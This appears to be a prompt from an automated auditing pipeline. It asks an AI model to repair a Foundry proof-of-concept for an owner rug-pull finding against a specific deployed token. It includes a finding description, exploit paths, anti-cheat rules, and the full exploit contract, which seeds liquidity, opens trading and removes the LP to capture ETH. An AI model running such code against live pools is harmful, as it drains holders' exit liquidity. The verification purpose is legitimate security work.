You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Owner receives the entire liquidity position and can later rug the pool
- claim: `openTrading()` creates the pair and adds liquidity with `owner()` as the LP recipient, so the deployer retains full custody of the liquidity tokens backing the market. Because the LP is not burned or locked, the owner can later remove the pool's ETH and token reserves at will.
- impact: After users buy in, the owner can withdraw liquidity and collapse the market, leaving holders with severely impaired or worthless tokens and no reliable exit liquidity.
- exploit_paths: ["Owner transfers launch tokens into the token contract so `balanceOf(address(this))` is non-zero.", "Owner calls `openTrading()` and `addLiquidityETH(..., owner(), ...)` mints the LP position to the owner.", "Owner later removes liquidity from the Uniswap pair using the LP tokens they control.", "Pool reserves are drained and holders are left with an illiquid or near-worthless token."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHoppy {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Minimal {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

contract FlawVerifier {
    enum ExecutionStatus {
        NotRun,
        BlockedNotOwner,
        BlockedNoLaunchTokens,
        BlockedNoSeedEth,
        BlockedNoLpTokens,
        ExecutedNoProfit,
        ExecutedWithProfit
    }

    address public constant TARGET = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private _profitAmount;
    ExecutionStatus public status;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() public {
        uint256 ethBefore = address(this).balance;

        IHoppy target = IHoppy(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(ROUTER);
        address actor = address(this);

        // Path stage 1 and stage 2 are owner-gated in the target.
        // If the verifier is not the live owner at the fork, this finding is a privileged rug vector,
        // not a permissionless exploit path that can be executed by an arbitrary attacker contract.
        if (target.owner() != actor) {
            status = ExecutionStatus.BlockedNotOwner;
            return;
        }

        address pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());

        // If launch has not happened yet, stay aligned with the reported path:
        // 1. owner transfers launch tokens into the token contract
        // 2. owner calls openTrading(), which mints LP to owner()
        if (pair == address(0)) {
            if (target.balanceOf(TARGET) == 0) {
                uint256 verifierTokenBalance = target.balanceOf(actor);
                if (verifierTokenBalance == 0) {
                    status = ExecutionStatus.BlockedNoLaunchTokens;
                    return;
                }
                require(target.transfer(TARGET, verifierTokenBalance), "seed transfer failed");
            }

            if (address(this).balance == 0) {
                status = ExecutionStatus.BlockedNoSeedEth;
                return;
            }

            (bool funded,) = payable(TARGET).call{value: address(this).balance}("");
            require(funded, "seed eth failed");

            target.openTrading();
            pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
            if (pair == address(0)) {
                status = ExecutionStatus.BlockedNoLpTokens;
                return;
            }
        }

        // Path stage 3: the owner later removes liquidity using the LP position minted to owner().
        uint256 lpBalance = IERC20Minimal(pair).balanceOf(actor);
        if (lpBalance == 0) {
            // At this fork, LP is not controlled by the verifier, so the owner-rug path cannot be
            // executed by this contract without changing the hypothesis or cheating with impersonation.
            status = ExecutionStatus.BlockedNoLpTokens;
            return;
        }

        require(IERC20Minimal(pair).approve(ROUTER, lpBalance), "lp approve failed");
        router.removeLiquidityETHSupportingFeeOnTransferTokens(
            TARGET,
            lpBalance,
            0,
            0,
            actor,
            block.timestamp
        );

        uint256 ethAfter = address(this).balance;
        if (ethAfter > ethBefore) {
            _profitAmount = ethAfter - ethBefore;
            status = ExecutionStatus.ExecutedWithProfit;
        } else {
            status = ExecutionStatus.ExecutedNoProfit;
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
